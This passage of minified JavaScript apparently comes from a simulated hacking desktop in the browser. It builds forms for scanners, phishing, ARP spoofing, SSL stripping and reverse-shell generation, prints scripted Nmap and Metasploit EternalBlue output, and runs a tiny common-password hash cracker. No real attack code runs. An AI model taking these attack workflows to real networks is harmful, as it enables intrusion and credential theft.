            <div><div class="settings-row-label">Desktop Wallpaper</div></div>
            <button class="tool-btn btn-primary" style="padding:6px 14px" onclick="changeWallpaper()">Change</button>
          </div>
          <div class="settings-row">
            <div><div class="settings-row-label">Transparency Effects</div>
              <div class="settings-row-sub">Blur and transparency on panels</div></div>
            <label class="toggle"><input type="checkbox" checked onchange="toggleTransparency(this)"><span class="toggle-slider"></span></label>
          </div>
          <div class="settings-row">
            <div><div class="settings-row-label">Animations</div></div>
            <label class="toggle"><input type="checkbox" checked><span class="toggle-slider"></span></label>
          </div>
          <div class="settings-row">
            <div><div class="settings-row-label">Font Size</div></div>
            <select class="tool-select" style="padding:4px 8px;font-size:0.78rem">
              <option>Small</option><option selected>Medium</option><option>Large</option>
            </select>
          </div>
        </div>
      </div>
      <div id="settings-network-${e}" class="settings-section">
        <div class="settings-group">
          <h3>Network Configuration</h3>
          <div class="settings-row"><div class="settings-row-label">IP Address</div><span style="font-family:var(--font-mono);font-size:0.78rem;color:var(--accent-cyan)">192.168.1.100</span></div>
          <div class="settings-row"><div class="settings-row-label">Gateway</div><span style="font-family:var(--font-mono);font-size:0.78rem;color:var(--text-secondary)">192.168.1.1</span></div>
          <div class="settings-row"><div class="settings-row-label">DNS Server</div><span style="font-family:var(--font-mono);font-size:0.78rem;color:var(--text-secondary)">8.8.8.8</span></div>
          <div class="settings-row"><div class="settings-row-label">MAC Address</div><span style="font-family:var(--font-mono);font-size:0.78rem;color:var(--text-secondary)">AA:BB:CC:DD:EE:FF</span></div>
          <div class="settings-row">
            <div><div class="settings-row-label">Tor Proxy</div><div class="settings-row-sub">Route traffic through Tor</div></div>
            <label class="toggle"><input type="checkbox"><span class="toggle-slider"></span></label>
          </div>
          <div class="settings-row">
            <div><div class="settings-row-label">VPN Kill Switch</div></div>
            <label class="toggle"><input type="checkbox"><span class="toggle-slider"></span></label>
          </div>
        </div>
      </div>
      <div id="settings-security-${e}" class="settings-section">
        <div class="settings-group">
          <h3>Security</h3>
          <div class="settings-row">
            <div><div class="settings-row-label">Firewall</div><div class="settings-row-sub">UFW is active</div></div>
            <label class="toggle"><input type="checkbox" checked><span class="toggle-slider"></span></label>
          </div>
          <div class="settings-row">
            <div><div class="settings-row-label">Auto-lock Screen</div></div>
            <select class="tool-select" style="padding:4px 8px;font-size:0.78rem">
              <option>5 minutes</option><option>10 minutes</option><option>Never</option>
            </select>
          </div>
          <div class="settings-row">
            <div><div class="settings-row-label">MAC Randomization</div></div>
            <label class="toggle"><input type="checkbox"><span class="toggle-slider"></span></label>
          </div>
        </div>
      </div>
      <div id="settings-terminal-${e}" class="settings-section">
        <div class="settings-group">
          <h3>Terminal Preferences</h3>
          <div class="settings-row">
            <div><div class="settings-row-label">Shell</div></div>
            <select class="tool-select" style="padding:4px 8px;font-size:0.78rem">
              <option>/bin/bash</option><option>/bin/zsh</option><option>/bin/fish</option>
            </select>
          </div>
          <div class="settings-row">
            <div><div class="settings-row-label">Font</div></div>
            <select class="tool-select" style="padding:4px 8px;font-size:0.78rem">
              <option>JetBrains Mono</option><option>Hack</option><option>Fira Code</option>
            </select>
          </div>
          <div class="settings-row">
            <div><div class="settings-row-label">Font Size</div></div>
            <input class="tool-input" value="13" style="width:60px;padding:4px 8px" />
          </div>
        </div>
      </div>
      <div id="settings-about-${e}" class="settings-section">
        <div class="settings-group">
          <h3>About BuildU</h3>
          <div class="settings-row"><div class="settings-row-label">Version</div><span style="font-family:var(--font-mono);font-size:0.8rem;color:var(--accent-cyan)">1.0.0</span></div>
          <div class="settings-row"><div class="settings-row-label">Kernel</div><span style="font-family:var(--font-mono);font-size:0.8rem;color:var(--text-secondary)">BYT-5.15.0-pentest-amd64</span></div>
          <div class="settings-row"><div class="settings-row-label">Desktop</div><span style="font-family:var(--font-mono);font-size:0.8rem;color:var(--text-secondary)">BYT-XFCE 4.18.1</span></div>
          <div class="settings-row"><div class="settings-row-label">Tools Installed</div><span style="font-family:var(--font-mono);font-size:0.8rem;color:var(--accent-green)">603 tools</span></div>
          <div class="settings-row"><div class="settings-row-label">Architecture</div><span style="font-family:var(--font-mono);font-size:0.8rem;color:var(--text-secondary)">x86_64</span></div>
        </div>
      </div>
    </div>
  </div>`}function ge(e){return`
  <div class="tool-body">
    <div class="sysinfo-grid">
      <div class="sysinfo-card">
        <h4>System</h4>
        <div class="sysinfo-row"><span class="sysinfo-key">Hostname</span><span class="sysinfo-val">byt</span></div>
        <div class="sysinfo-row"><span class="sysinfo-key">OS</span><span class="sysinfo-val">BuildU 1.0</span></div>
        <div class="sysinfo-row"><span class="sysinfo-key">Kernel</span><span class="sysinfo-val">5.15.0-pentest-amd64</span></div>
        <div class="sysinfo-row"><span class="sysinfo-key">Architecture</span><span class="sysinfo-val">x86_64</span></div>
        <div class="sysinfo-row"><span class="sysinfo-key">Uptime</span><span class="sysinfo-val" id="uptime-${e}">0:00:00</span></div>
        <div class="sysinfo-row"><span class="sysinfo-key">User</span><span class="sysinfo-val">root</span></div>
        <div class="sysinfo-row"><span class="sysinfo-key">Shell</span><span class="sysinfo-val">/bin/bash 5.2.15</span></div>
      </div>
      <div class="sysinfo-card">
        <h4>Hardware</h4>
        <div class="sysinfo-row"><span class="sysinfo-key">CPU</span><span class="sysinfo-val">Intel Core i9-13900K</span></div>
        <div class="sysinfo-row"><span class="sysinfo-key">Cores</span><span class="sysinfo-val">24 (8P+16E)</span></div>
        <div class="sysinfo-row"><span class="sysinfo-key">RAM</span><span class="sysinfo-val">32 GB DDR5</span></div>
        <div class="sysinfo-row"><span class="sysinfo-key">Disk</span><span class="sysinfo-val">1 TB NVMe SSD</span></div>
        <div class="sysinfo-row"><span class="sysinfo-key">GPU</span><span class="sysinfo-val">NVIDIA RTX 4090</span></div>
        <div class="sysinfo-row"><span class="sysinfo-key">Network</span><span class="sysinfo-val">eth0 / wlan0</span></div>
      </div>
      <div class="sysinfo-card">
        <h4>CPU Usage</h4>
        <div class="gauge"><div class="gauge-label"><span>CPU 0</span><span id="cpu0-${e}">0%</span></div>
          <div class="gauge-bar"><div class="gauge-fill cyan" id="cpu0b-${e}" style="width:0%"></div></div></div>
        <div class="gauge"><div class="gauge-label"><span>CPU 1</span><span id="cpu1-${e}">0%</span></div>
          <div class="gauge-bar"><div class="gauge-fill cyan" id="cpu1b-${e}" style="width:0%"></div></div></div>
        <div class="gauge"><div class="gauge-label"><span>Memory</span><span id="mem-${e}">0%</span></div>
          <div class="gauge-bar"><div class="gauge-fill green" id="memb-${e}" style="width:0%"></div></div></div>
        <div class="gauge"><div class="gauge-label"><span>Disk I/O</span><span id="disk-${e}">0%</span></div>
          <div class="gauge-bar"><div class="gauge-fill red" id="diskb-${e}" style="width:0%"></div></div></div>
      </div>
      <div class="sysinfo-card">
        <h4>Network</h4>
        <div class="sysinfo-row"><span class="sysinfo-key">IP Address</span><span class="sysinfo-val">192.168.1.100</span></div>
        <div class="sysinfo-row"><span class="sysinfo-key">Gateway</span><span class="sysinfo-val">192.168.1.1</span></div>
        <div class="sysinfo-row"><span class="sysinfo-key">DNS</span><span class="sysinfo-val">8.8.8.8</span></div>
        <div class="sysinfo-row"><span class="sysinfo-key">↑ TX</span><span class="sysinfo-val" id="tx-${e}">0 B/s</span></div>
        <div class="sysinfo-row"><span class="sysinfo-key">↓ RX</span><span class="sysinfo-val" id="rx-${e}">0 B/s</span></div>
        <div class="sysinfo-row"><span class="sysinfo-key">MAC</span><span class="sysinfo-val">00:1a:2b:3c:4d:5e</span></div>
      </div>
    </div>
  </div>`}function $e(e){return w(e,"whois","🔍","Whois Lookup","Query domain registration information",[{id:"domain",label:"Domain or IP",ph:"example.com or 8.8.8.8"}],"runWhois")}function xe(e){return w(e,"dns","📡","DNS Lookup","Query DNS records for a domain",[{id:"domain",label:"Domain",ph:"example.com"},{id:"type",label:"Record Type",sel:["A","AAAA","MX","NS","TXT","CNAME","SOA","PTR","ANY"]}],"runDNS")}function Se(e){return w(e,"tr","🗺️","Traceroute","Trace network path to a host",[{id:"host",label:"Host",ph:"google.com or 8.8.8.8"},{id:"maxhops",label:"Max Hops",ph:"30"}],"runTraceroute")}function Te(e){return w(e,"sub","🕸️","Subdomain Finder","Enumerate subdomains of a target",[{id:"domain",label:"Domain",ph:"example.com"},{id:"wordlist",label:"Wordlist",sel:["common.txt","subdomains-top1million-5000.txt","fierce.txt","dnsmap.txt"]}],"runSubdomains")}function ke(e){return w(e,"nikto","🛡️","Nikto Web Scanner","Scan web server for vulnerabilities",[{id:"url",label:"Target URL",ph:"https://target.com"},{id:"port",label:"Port",ph:"80"},{id:"ssl",label:"SSL",sel:["Auto","Yes","No"]}],"runNikto")}function Ee(e){return w(e,"ova","🔬","OpenVAS Vulnerability Scanner","Comprehensive vulnerability scanner",[{id:"target",label:"Target",ph:"192.168.1.0/24"},{id:"scan_type",label:"Scan Type",sel:["Full and Fast","Deep","Discovery Only"]}],"runOpenVAS")}function Ce(e){return w(e,"wp","📰","WPScan","WordPress vulnerability scanner",[{id:"url",label:"WordPress URL",ph:"https://example.com"},{id:"enum",label:"Enumerate",sel:["All","Users","Plugins","Themes","Timthumbs"]}],"runWPScan")}function we(e){return w(e,"xss","⚡","XSS Hunter","Find cross-site scripting vulnerabilities",[{id:"url",label:"Target URL",ph:"https://target.com/search?q="},{id:"payload_type",label:"Payload Type",sel:["Reflected","Stored","DOM-Based","Blind"]}],"runXSSHunter")}function Me(e){return w(e,"dirb","📂","DirBuster","Web directory and file brute-forcer",[{id:"url",label:"Target URL",ph:"https://target.com"},{id:"wordlist",label:"Wordlist",sel:["directory-list-2.3-medium.txt","common.txt","big.txt"]},{id:"ext",label:"Extensions",ph:".php,.html,.txt"}],"runDirb")}function Pe(e){return w(e,"wl","📋","Wordlist Generator","Generate custom wordlists with crunch/cewl",[{id:"min",label:"Min Length",ph:"4"},{id:"max",label:"Max Length",ph:"8"},{id:"charset",label:"Charset",ph:"abc123"},{id:"pattern",label:"Pattern",ph:"????@@@@"}],"runWordlist")}function Ae(e){return w(e,"wifi","📶","WiFi Analyzer","Scan and analyze wireless networks",[{id:"iface",label:"Interface",sel:["wlan0","wlan1","wlan0mon"]},{id:"band",label:"Band",sel:["All","2.4 GHz","5 GHz"]}],"runWifiAnalyzer")}function Le(e){return w(e,"kismet","📡","Kismet","Wireless network detector and sniffer",[{id:"iface",label:"Interface",sel:["wlan0mon","wlan0","wlan1"]},{id:"output",label:"Output File",ph:"kismet-capture"}],"runKismet")}function He(e){return w(e,"set","🎭","Social Engineer Toolkit","Social engineering attacks framework",[{id:"attack",label:"Attack Vector",sel:["Phishing Email","Credential Harvester","USB HID Attack","QR Code Attack","Spear-Phishing"]},{id:"target",label:"Target Email/Domain",ph:"target@example.com"}],"runSET")}function Be(e){return w(e,"sg","🐚","Shellcode Generator","Generate reverse/bind shell payloads",[{id:"platform",label:"Platform",sel:["Linux x86","Linux x64","Windows x86","Windows x64","macOS","PHP","Python","PowerShell"]},{id:"type",label:"Type",sel:["Reverse Shell","Bind Shell","Meterpreter Reverse","Staged"]},{id:"lhost",label:"LHOST",ph:"192.168.1.100"},{id:"lport",label:"LPORT",ph:"4444"}],"runShellgen")}function _e(e){return w(e,"arp","⚠️","ARP Spoofer","Perform ARP poisoning / MITM attacks",[{id:"iface",label:"Interface",sel:["eth0","wlan0"]},{id:"target",label:"Target IP",ph:"192.168.1.1"},{id:"gateway",label:"Gateway IP",ph:"192.168.1.254"}],"runArpSpoof")}function De(e){return w(e,"ssl","🔓","SSLStrip","HTTPS stripping / downgrade attack",[{id:"iface",label:"Interface",sel:["eth0","wlan0"]},{id:"port",label:"Listen Port",ph:"8080"}],"runSSLStrip")}function Fe(e){return w(e,"bw","🔎","Binwalk","Analyze and extract firmware images",[{id:"file",label:"Target File",ph:"/path/to/firmware.bin"},{id:"opts",label:"Options",sel:["Scan Only","-e (Extract)","--dd (Raw Extract)","-A (Opcodes)"]}],"runBinwalk")}function Oe(e){return w(e,"aut","🔬","Autopsy Digital Forensics","Digital forensics platform for disk analysis",[{id:"image",label:"Disk Image",ph:"/evidence/disk.img"},{id:"type",label:"Case Type",sel:["Full Analysis","File System Only","Hash Lookup","Registry Analysis"]}],"runAutopsy")}function Re(e){return w(e,"steg","🖼️","Steghide","Steganography - hide/extract data from images",[{id:"mode",label:"Mode",sel:["Embed","Extract","Info"]},{id:"file",label:"Cover File",ph:"/path/to/image.jpg"},{id:"pass",label:"Passphrase",ph:"secret"}],"runSteghide")}function Ne(e){return setTimeout(()=>{typeof F=="function"&&F(e,"/root")},40),`
  <div style="display:flex;flex-direction:column;height:100%">
    <div class="fm-toolbar">
      <button class="fm-toolbar-btn" onclick="fmNav('up','${e}')">↑ Up</button>
      <span class="fm-path" id="fm-path-${e}">/root</span>
      <button class="fm-toolbar-btn" onclick="fmNew('file','${e}')">+ File</button>
      <button class="fm-toolbar-btn" onclick="fmNew('dir','${e}')">+ Dir</button>
    </div>
    <div class="fm-container">
      <div class="fm-sidebar">
        <div class="fm-sidebar-item active" onclick="fmGoTo('/root','${e}',this)">🏠 /root</div>
        <div class="fm-sidebar-item" onclick="fmGoTo('/','${e}',this)">💻 / (Root)</div>
        <div class="fm-sidebar-item" onclick="fmGoTo('/etc','${e}',this)">⚙️ /etc</div>
        <div class="fm-sidebar-item" onclick="fmGoTo('/var','${e}',this)">📁 /var</div>
        <div class="fm-sidebar-item" onclick="fmGoTo('/tmp','${e}',this)">📁 /tmp</div>
        <div class="fm-sidebar-item" onclick="fmGoTo('/usr/share/wordlists','${e}',this)">📋 Wordlists</div>
        <div class="fm-sidebar-item" onclick="fmGoTo('/opt','${e}',this)">🔧 /opt</div>
      </div>
      <div class="fm-main">
        <div class="fm-grid" id="fm-grid-${e}"></div>
      </div>
    </div>
    <div style="padding:4px 12px;background:var(--bg-darker);border-top:1px solid var(--border);font-family:var(--font-mono);font-size:0.68rem;color:var(--text-dim)" id="fm-status-${e}">
      BuildU Virtual Filesystem
    </div>
  </div>`}function w(e,t,s,o,n,a,i){const l=a.map(r=>r.sel?`<div class="tool-field"><label>${r.label}</label>
      <select class="tool-select" id="${t}-${r.id}-${e}">${r.sel.map(b=>`<option>${b}</option>`).join("")}</select></div>`:`<div class="tool-field"><label>${r.label}</label>
      <input class="tool-input" id="${t}-${r.id}-${e}" placeholder="${r.ph||""}" /></div>`).join("");return`
  <div class="tool-panel">
    <div class="tool-header">
      <div class="tool-icon">${s}</div>
      <div class="tool-header-info"><h3>${o}</h3><p>${n}</p></div>
    </div>
    <div class="tool-body">
      <div class="tool-section">
        <div class="tool-row">${l}</div>
      </div>
      <div class="tool-row">
        <button class="tool-btn btn-primary" onclick="${i}('${e}')">▶ Run</button>
        <button class="tool-btn btn-danger" onclick="stopTool('${e}')">■ Stop</button>
        <button class="tool-btn" style="border:1px solid var(--border);color:var(--text-dim)" onclick="clearOutput('${e}')">Clear</button>
      </div>
      <div class="tool-progress" id="${t}-prog-${e}"><div class="tool-progress-bar" id="${t}-bar-${e}"></div></div>
      <div class="tool-output" id="${t}-out-${e}">
        <span class="out-info">// Configure options and click Run.</span>
      </div>
    </div>
  </div>`}function Ue(e,t,s){document.querySelectorAll(`#hash-types-${s} .hash-type-btn`).forEach(o=>o.classList.remove("active")),e.classList.add("active")}function We(e,t,s){document.querySelectorAll(".msf-module-item").forEach(a=>a.classList.remove("active")),e.classList.add("active");const o=document.getElementById(`msf-module-title-${s}`),n=document.getElementById(`msf-options-${s}`);o&&(o.textContent=`msf6 exploit(${t}) >`),n&&(n.innerHTML=`
      <div style="display:flex;gap:8px;flex-wrap:wrap;align-items:flex-end">
        <div class="tool-field"><label>RHOSTS</label><input class="tool-input" id="msf-rhost-${s}" placeholder="192.168.1.1" /></div>
        <div class="tool-field"><label>RPORT</label><input class="tool-input" id="msf-rport-${s}" value="445" style="width:70px" /></div>
        <div class="tool-field"><label>LHOST</label><input class="tool-input" id="msf-lhost-${s}" value="192.168.1.100" /></div>
        <div class="tool-field"><label>LPORT</label><input class="tool-input" id="msf-lport-${s}" value="4444" style="width:70px" /></div>
        <button class="tool-btn btn-primary" onclick="runMSF('${t}','${s}')">▶ exploit</button>
        <button class="tool-btn btn-success" style="padding:9px 12px" onclick="msfCheck('${t}','${s}')">check</button>
      </div>`),B(s,`
<span class="prompt">msf6 > </span>use ${t}
<span class="info" style="color:var(--accent-cyan)">[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp</span>
<span class="prompt">msf6 exploit(${t.split("/").pop()}) > </span>`)}function qe(e,t){if(e.key!=="Enter")return;const s=document.getElementById(`msf-input-${t}`),o=s.value.trim();s.value="",B(t,`<span class="prompt">msf6 > </span>${o}`),Z(o).forEach(a=>B(t,a)),B(t,'<span class="prompt">msf6 > </span>')}function Z(e){return{help:["Core Commands:","  help     - Show help menu","  use      - Select module","  show exploits - Show all exploits","  search  - Search modules","  sessions - List sessions","  exit     - Exit Metasploit"],"show exploits":["Exploits: 2376 total","  windows/smb/ms17_010_eternalblue - EternalBlue SMB RCE","  unix/ftp/vsftpd_234_backdoor - VSFTPD Backdoor","  multi/handler - Generic Payload Handler"],sessions:["Active sessions: none"],version:["Framework: 6.3.44-dev","Console: 6.3.44-dev"],"search eternalblue":["[*] Searching for module...",`
Matching Modules
================`,`  exploit/windows/smb/ms17_010_eternalblue
  auxiliary/scanner/smb/smb_ms17_010`]}[e.toLowerCase()]||[`[-] Unknown command: ${e}`,"Type help for usage."]}function B(e,t){const s=document.getElementById(`msf-out-${e}`);if(!s)return;const o=document.createElement("span");o.innerHTML=t+`
`,s.appendChild(o),s.scrollTop=s.scrollHeight}function Ve(e,t){var i,l,r;const s=((i=document.getElementById(`msf-rhost-${t}`))==null?void 0:i.value)||"192.168.1.1",o=((l=document.getElementById(`msf-lhost-${t}`))==null?void 0:l.value)||"192.168.1.100",n=((r=document.getElementById(`msf-lport-${t}`))==null?void 0:r.value)||"4444";[`<span class="out-info">[*] Started reverse TCP handler on ${o}:${n}</span>`,`<span class="out-info">[*] ${s}:445 - Attempting to trigger the vulnerability...</span>`,'<span class="out-warn">[*] Sending egg to introduce the shellcode...</span>','<span class="out-warn">[*] Triggering the vulnerability...</span>',`<span class="out-success">[+] ${s}:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=</span>`,`<span class="out-success">[+] ${s}:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=</span>`,`<span class="out-success">[+] ${s}:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=</span>`,`<span class="out-success">[*] Meterpreter session 1 opened (${o}:${n} -> ${s}:49152)</span>`,'<span class="out-info">meterpreter > </span>'].forEach((b,h)=>setTimeout(()=>B(t,b),h*600))}function ze(e,t){B(t,`<span class="out-info">[*] Checking target...
[+] The target appears to be vulnerable.</span>`)}function je(e){var l,r,b;const t=((l=document.getElementById(`nmap-target-${e}`))==null?void 0:l.value)||"192.168.1.0/24";(r=document.getElementById(`nmap-ports-${e}`))!=null&&r.value,(b=document.getElementById(`nmap-type-${e}`))!=null&&b.value;const s=document.getElementById(`nmap-out-${e}`),o=document.getElementById(`nmap-bar-${e}`);if(!s)return;s.innerHTML="";const n=[`<span class="out-header">Starting Nmap 7.94SVN ( https://nmap.org ) at ${new Date().toLocaleString()}</span>`,`<span class="out-info">Nmap scan report for ${t}</span>`,'<span class="out-info">Host is up (0.0045s latency).</span>','<span class="out-line">Not shown: 988 closed tcp ports (reset)</span>','<span class="out-header">PORT      STATE SERVICE         VERSION</span>','<span class="out-success">22/tcp    open  ssh             OpenSSH 8.9p1</span>','<span class="out-success">25/tcp    open  smtp            Postfix smtpd</span>','<span class="out-success">80/tcp    open  http            Apache httpd 2.4.54</span>','<span class="out-success">110/tcp   open  pop3            Dovecot pop3d</span>','<span class="out-success">143/tcp   open  imap            Dovecot imapd</span>','<span class="out-success">443/tcp   open  https           Apache httpd 2.4.54</span>','<span class="out-success">445/tcp   open  microsoft-ds    Windows 10 MS-DS</span>','<span class="out-warn">1234/tcp  filtered unknown</span>','<span class="out-success">3306/tcp  open  mysql           MySQL 8.0.33</span>','<span class="out-success">3389/tcp  open  ms-wbt-server   Microsoft Terminal Services</span>','<span class="out-success">5432/tcp  open  postgresql      PostgreSQL 14.9</span>','<span class="out-success">8080/tcp  open  http-proxy      Apache Tomcat</span>','<span class="out-line">MAC Address: AA:BB:CC:DD:EE:FF (Unknown)</span>','<span class="out-info">OS details: Linux 5.15 (96%), Windows 10 1903-21H1 (94%)</span>','<span class="out-success">Nmap done: 1 IP address (1 host up) scanned in 12.45 seconds</span>'];let a=0;const i=setInterval(()=>{if(a<n.length){const h=document.createElement("span");h.className="out-line",h.innerHTML=n[a]+`
`,s.appendChild(h),s.scrollTop=s.scrollHeight,o.style.width=`${Math.floor(a/n.length*100)}%`,a++}else clearInterval(i),o.style.width="100%"},250)}function Ge(e){var a,i;const t=(i=(a=document.getElementById(`hash-val-${e}`))==null?void 0:a.value)==null?void 0:i.trim(),s=document.getElementById(`hash-out-${e}`);if(!s)return;if(!t){s.innerHTML='<span class="out-err">// Please enter a hash value.</span>';return}const o=t.length;let n="Unknown";o===32&&/^[a-f0-9]+$/i.test(t)?n="MD5 or NTLM":o===40?n="SHA-1 or RIPEMD-160":o===64?n="SHA-256 or BLAKE2s-256":o===128?n="SHA-512 or Whirlpool":t.startsWith("$2a$")||t.startsWith("$2b$")?n="bcrypt":t.startsWith("$1$")?n="MD5crypt":t.startsWith("$6$")&&(n="SHA-512crypt"),s.innerHTML=`<span class="out-header">[*] Hash Analysis</span>
<span class="out-info">Hash: ${t.substring(0,32)}${t.length>32?"...":""}</span>
<span class="out-info">Length: ${o} chars</span>
<span class="out-success">[+] Possible type: ${n}</span>`}function j(e){function t(d,g){return d<<g|d>>>32-g}function s(d,g){const $=d&1073741824,k=g&1073741824,E=d&2147483648,P=g&2147483648,y=(d&1073741823)+(g&1073741823);return $&k?y^2147483648^E^P:$|k?y&1073741824?y^3221225472^E^P:y^1073741824^E^P:y^E^P}function o(d,g,$){return d&g|~d&$}function n(d,g,$){return d&$|g&~$}function a(d,g,$){return d^g^$}function i(d,g,$){return g^(d|~$)}function l(d,g,$,k,E,P,y){return s(t(s(s(d,o(g,$,k)),s(E,y)),P),g)}function r(d,g,$,k,E,P,y){return s(t(s(s(d,n(g,$,k)),s(E,y)),P),g)}function b(d,g,$,k,E,P,y){return s(t(s(s(d,a(g,$,k)),s(E,y)),P),g)}function h(d,g,$,k,E,P,y){return s(t(s(s(d,i(g,$,k)),s(E,y)),P),g)}function T(d){let g;const $=d.length,k=$+8,P=((k-k%64)/64+1)*16,y=Array(P-1);let S=0,C=0;for(;C<$;)g=(C-C%4)/4,S=C%4*8,y[g]=y[g]|d.charCodeAt(C)<<S,C++;return g=(C-C%4)/4,S=C%4*8,y[g]=y[g]|128<<S,y[P-2]=$<<3,y[P-1]=$>>>29,y}function L(d){let g="",$="",k,E;for(E=0;E<=3;E++)k=d>>>E*8&255,$="0"+k.toString(16),g=g+$.substr($.length-2,2);return g}const f=T(e);let p=1732584193,u=4023233417,v=2562383102,m=271733878;for(let d=0;d<f.length;d+=16){const g=p,$=u,k=v,E=m;p=l(p,u,v,m,f[d+0],7,3614090360),m=l(m,p,u,v,f[d+1],12,3905402710),v=l(v,m,p,u,f[d+2],17,606105819),u=l(u,v,m,p,f[d+3],22,3250441966),p=l(p,u,v,m,f[d+4],7,4118548399),m=l(m,p,u,v,f[d+5],12,1200080426),v=l(v,m,p,u,f[d+6],17,2821735955),u=l(u,v,m,p,f[d+7],22,4249261313),p=l(p,u,v,m,f[d+8],7,1770035416),m=l(m,p,u,v,f[d+9],12,2336552879),v=l(v,m,p,u,f[d+10],17,4294925233),u=l(u,v,m,p,f[d+11],22,2304563134),p=l(p,u,v,m,f[d+12],7,1804603682),m=l(m,p,u,v,f[d+13],12,4254626195),v=l(v,m,p,u,f[d+14],17,2792965006),u=l(u,v,m,p,f[d+15],22,1236535329),p=r(p,u,v,m,f[d+1],5,4129170786),m=r(m,p,u,v,f[d+6],9,3225465664),v=r(v,m,p,u,f[d+11],14,643717713),u=r(u,v,m,p,f[d+0],20,3921069994),p=r(p,u,v,m,f[d+5],5,3593408605),m=r(m,p,u,v,f[d+10],9,38016083),v=r(v,m,p,u,f[d+15],14,3634488961),u=r(u,v,m,p,f[d+4],20,3889429448),p=r(p,u,v,m,f[d+9],5,568446438),m=r(m,p,u,v,f[d+14],9,3275163606),v=r(v,m,p,u,f[d+3],14,4107603335),u=r(u,v,m,p,f[d+8],20,1163531501),p=r(p,u,v,m,f[d+13],5,2850285829),m=r(m,p,u,v,f[d+2],9,4243563512),v=r(v,m,p,u,f[d+7],14,1735328473),u=r(u,v,m,p,f[d+12],20,2368359562),p=b(p,u,v,m,f[d+5],4,4294588738),m=b(m,p,u,v,f[d+8],11,2272392833),v=b(v,m,p,u,f[d+11],16,1839030562),u=b(u,v,m,p,f[d+14],23,4259657740),p=b(p,u,v,m,f[d+1],4,2763975236),m=b(m,p,u,v,f[d+4],11,1272893353),v=b(v,m,p,u,f[d+7],16,4139469664),u=b(u,v,m,p,f[d+10],23,3200236656),p=b(p,u,v,m,f[d+13],4,681279174),m=b(m,p,u,v,f[d+0],11,3936430074),v=b(v,m,p,u,f[d+3],16,3572445317),u=b(u,v,m,p,f[d+6],23,76029189),p=b(p,u,v,m,f[d+9],4,3654602809),m=b(m,p,u,v,f[d+12],11,3873151461),v=b(v,m,p,u,f[d+15],16,530742520),u=b(u,v,m,p,f[d+2],23,3299628645),p=h(p,u,v,m,f[d+0],6,4096336452),m=h(m,p,u,v,f[d+7],10,1126891415),v=h(v,m,p,u,f[d+14],15,2878612391),u=h(u,v,m,p,f[d+5],21,4237533241),p=h(p,u,v,m,f[d+12],6,1700485571),m=h(m,p,u,v,f[d+3],10,2399980690),v=h(v,m,p,u,f[d+10],15,4293915773),u=h(u,v,m,p,f[d+1],21,2240044497),p=h(p,u,v,m,f[d+8],6,1873313359),m=h(m,p,u,v,f[d+15],10,4264355552),v=h(v,m,p,u,f[d+6],15,2734768916),u=h(u,v,m,p,f[d+13],21,1309151649),p=h(p,u,v,m,f[d+4],6,4149444226),m=h(m,p,u,v,f[d+11],10,3174756917),v=h(v,m,p,u,f[d+2],15,718787259),u=h(u,v,m,p,f[d+9],21,3951481745),p=s(p,g),u=s(u,$),v=s(v,k),m=s(m,E)}return(L(p)+L(u)+L(v)+L(m)).toLowerCase()}async function D(e,t="SHA-256"){const s=await crypto.subtle.digest(t,new TextEncoder().encode(e));return Array.from(new Uint8Array(s)).map(o=>o.toString(16).padStart(2,"0")).join("")}async function Ke(e){var r,b;const t=((b=(r=document.getElementById(`hash-val-${e}`))==null?void 0:r.value)==null?void 0:b.trim())||"",s=document.getElementById(`hash-out-${e}`),o=document.getElementById(`hash-bar-${e}`);if(!s)return;if(!t){s.innerHTML='<span class="out-err">[!] Please enter a hash string to crack.</span>';return}s.innerHTML=`<span class="out-header">[*] BuildU WebCrypto Cracking Engine initialized</span>
<span class="out-info">Target: ${t}</span>
<span class="out-info">Loaded wordlists from VFS: /usr/share/wordlists/rockyou.txt</span>
`;const n=["password","123456","12345678","admin","toor","roottoor","letmein","welcome","qwerty","monkey","dragon","master","iloveyou","sunshine","batman","superman","buildu2026","pass123","secret","shadow","hunter2","football","login","pentest","kali","root"];let a=!1,i=0;const l=performance.now();for(let h=0;h<n.length;h++){const T=n[h];i++;const L=j(T),f=await D(T,"SHA-256"),p=await D(T,"SHA-1");if(t.toLowerCase()===L||t.toLowerCase()===f||t.toLowerCase()===p){a=!0;const u=((performance.now()-l)/1e3).toFixed(3);s.innerHTML+=`<span class="out-success">[+] ====================================================</span>
<span class="out-success" style="font-weight:700">[+] HASH CRACKED IN ${u}s!</span>
<span class="out-success">[+] Plaintext: "${T}"</span>
<span class="out-info">[+] Hash: ${t}</span>
<span class="out-info">[+] Checked: ${i} candidates (${(i/Math.max(.001,u)).toFixed(0)} hashes/sec)</span>
<span class="out-success">[+] ====================================================</span>
`,o.style.width="100%",typeof showToast=="function"&&showToast("Hash Cracked!",`Plaintext: ${T}`,"success","🔓");break}o.style.width=`${Math.floor((h+1)/n.length*100)}%`}a||(s.innerHTML+=`<span class="out-line">[-] Exhausted dictionary (${i} words tested).</span>
<span class="out-warn">[!] Hash not in fast rockyou sample. Try generating hashes to test!</span>
`)}async function Qe(e){var l,r;const t=((r=(l=document.getElementById(`hash-val-${e}`))==null?void 0:l.value)==null?void 0:r.trim())||"password",s=document.getElementById(`hash-out-${e}`);if(!s)return;const o=j(t),n=await D(t,"SHA-1"),a=await D(t,"SHA-256"),i=await D(t,"SHA-512");s.innerHTML=`<span class="out-header">[*] BuildU Cryptographic Generator</span>
<span class="out-info">Input Plaintext: "${t}"</span>
<span class="out-line">----------------------------------------------------</span>
<span class="out-success">MD5:     ${o}</span>
<span class="out-success">SHA-1:   ${n}</span>
<span class="out-success">SHA-256: ${a}</span>
<span class="out-success">SHA-512: ${i.substring(0,32)}...</span>
`,typeof showToast=="function"&&showToast("Hashes Generated",`Calculated hashes for "${t}"`,"info","🔐")}function Je(e){var a;const t=((a=document.getElementById(`sql-url-${e}`))==null?void 0:a.value)||"http://target.com/page.php?id=1",s=document.getElementById(`sql-out-${e}`),o=document.getElementById(`sql-bar-${e}`);if(!s)return;const n=[`<span class="out-header">        ___       __          __
       /   |     / /___  ____ _/  |_
      / /| |    / / __ \\/ __ \`/ / __/
     / ___ |   / / / / / /_/ / / /_
    /_/  |_|  /_/_/ /_/\\__,_/_/\\__/
